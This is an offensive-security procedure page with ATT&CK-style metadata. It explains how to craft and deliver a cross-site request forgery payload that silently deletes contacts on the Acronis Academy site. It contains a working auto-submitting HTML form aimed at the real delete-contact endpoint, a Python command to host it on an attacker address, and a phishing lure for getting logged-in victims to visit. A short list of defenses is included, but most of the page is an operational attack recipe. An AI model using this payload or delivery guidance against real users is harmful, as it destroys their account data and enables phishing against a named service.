---
id: proc-craft-csrf-acronis-001
tags:
  - csrf-exploit
  - payload-delivery
  - drive-by
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:57.615Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft and Deliver CSRF Payload to Delete Contacts

## Summary

This procedure covers creating a malicious HTML page that auto-submits a GET request to delete contacts in Acronis Academy, exploiting the CSRF vulnerability by tricking the victim into visiting it while authenticated.

## Description

The payload is a simple form with JavaScript auto-submit targeting the vulnerable endpoint. Delivery via phishing email or malicious link ensures execution in the victim's browser, leveraging their session. No user interaction needed beyond page load. This achieves unauthorized deletion of email, phone, etc., impacting user data integrity.

## Requirements

1. Knowledge of target contact_id from analysis
2. Hosting capability for the HTML page (e.g., local server or remote host)
3. Victim's authenticated state in Acronis Academy

## Defense

Defensive measures and detection strategies:

- Require POST for destructive actions and validate CSRF tokens
- Educate users on phishing and suspicious links
- Implement Content Security Policy (CSP) to block inline scripts

## Objectives

1. Construct the auto-submitting form
2. Host and deliver the payload
3. Achieve silent deletion of contacts

## Instructions

### Step 1: Create Malicious HTML

**Context**: Build the payload file.

Write an HTML file with a hidden form:

```html
<!DOCTYPE html>
<html><body>
<form id="deleteForm" action="https://academy.acronis.com/account/delete-contact/contact_id/<target_contact_id>" method="GET"></form>
<script>document.getElementById('deleteForm').submit();</script>
</body></html>
```
Replace <target_contact_id>.

> Save as index.html.

### Step 2: Host the Page

**Context**: Make it accessible via URL.

Use a simple server like Python: python -m http.server 8000, or upload to a web host.

> Access via http://attacker-ip:8000.

### Step 3: Deliver to Victim

**Context**: Trick the victim into visiting while logged in.

Send the link via email or social engineering: "Click here for important update."

> Upon visit, form submits; verify deletion in victim's account.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf-payload
- exploit-delivery
